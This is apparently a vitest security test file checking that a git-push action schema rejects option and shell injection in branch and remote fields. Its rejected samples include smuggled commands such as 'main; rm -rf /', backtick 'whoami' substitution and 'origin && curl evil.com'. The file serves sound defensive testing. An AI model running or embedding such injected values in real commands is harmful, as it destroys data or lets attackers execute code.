/** QA automation tests for Story 18.1 security hardening — action schema git ref validation. */
import { describe, it, expect } from 'vitest';
import { GitPushActionSchema } from './action.js';

// ---------------------------------------------------------------------------
// AC4: git ref regex validation — extended coverage
// ---------------------------------------------------------------------------

describe('GitPushActionSchema — AC4: extended git ref injection prevention', () => {
  // Valid branch names that must be accepted
  const validBranches = [
    'main',
    'develop',
    'feature/login',
    'hotfix/CVE-2026-1234',
    'release/1.2.3',
    'sparecrow/fix-bugs-20260314T000000Z',
    'my_feature_branch',
    'v1.0.0',
    '.hidden-branch',
    '_underscore-start',
  ];

  for (const branch of validBranches) {
    it(`accepts valid branch name: "${branch}"`, () => {
      const result = GitPushActionSchema.safeParse({ type: 'git-push', branch });
      expect(result.success, `"${branch}" should be accepted`).toBe(true);
    });
  }

  // Injection attempts that must be rejected
  it('rejects "--delete" (long-option injection)', () => {
    const result = GitPushActionSchema.safeParse({ type: 'git-push', branch: '--delete' });
    expect(result.success).toBe(false);
  });

  it('rejects "--force" (long-option injection)', () => {
    const result = GitPushActionSchema.safeParse({ type: 'git-push', branch: '--force' });
    expect(result.success).toBe(false);
  });

  it('rejects "-u" (short-option injection)', () => {
    const result = GitPushActionSchema.safeParse({ type: 'git-push', branch: '-u' });
    expect(result.success).toBe(false);
  });

  it('rejects branch with semicolon shell injection', () => {
    const result = GitPushActionSchema.safeParse({
      type: 'git-push',
      branch: 'main; rm -rf /',
    });
    expect(result.success).toBe(false);
  });

  it('rejects branch with backtick shell injection', () => {
    const result = GitPushActionSchema.safeParse({
      type: 'git-push',
      branch: 'main`whoami`',
    });
    expect(result.success).toBe(false);
  });

  it('rejects branch longer than 255 characters', () => {
    const result = GitPushActionSchema.safeParse({
      type: 'git-push',
      branch: 'a'.repeat(256),
    });
    expect(result.success).toBe(false);
  });

  it('accepts branch at exactly 255 characters', () => {
    const result = GitPushActionSchema.safeParse({
      type: 'git-push',
      branch: 'a'.repeat(255),
    });
    expect(result.success).toBe(true);
  });

  it('rejects empty branch name', () => {
    const result = GitPushActionSchema.safeParse({ type: 'git-push', branch: '' });
    expect(result.success).toBe(false);
  });

  // Remote field injection
  it('rejects remote "--mirror" (option injection)', () => {
    const result = GitPushActionSchema.safeParse({
      type: 'git-push',
      branch: 'main',
      remote: '--mirror',
    });
    expect(result.success).toBe(false);
  });

  it('rejects remote with shell metacharacters', () => {
    const result = GitPushActionSchema.safeParse({
      type: 'git-push',
      branch: 'main',
      remote: 'origin && curl evil.com',
    });
    expect(result.success).toBe(false);
  });

  it('accepts valid remote name "origin"', () => {
    const result = GitPushActionSchema.safeParse({
      type: 'git-push',
      branch: 'main',
      remote: 'origin',
    });
    expect(result.success).toBe(true);
  });

  it('accepts valid remote name "upstream"', () => {
    const result = GitPushActionSchema.safeParse({
      type: 'git-push',
      branch: 'main',
      remote: 'upstream',
    });
    expect(result.success).toBe(true);
  });
});
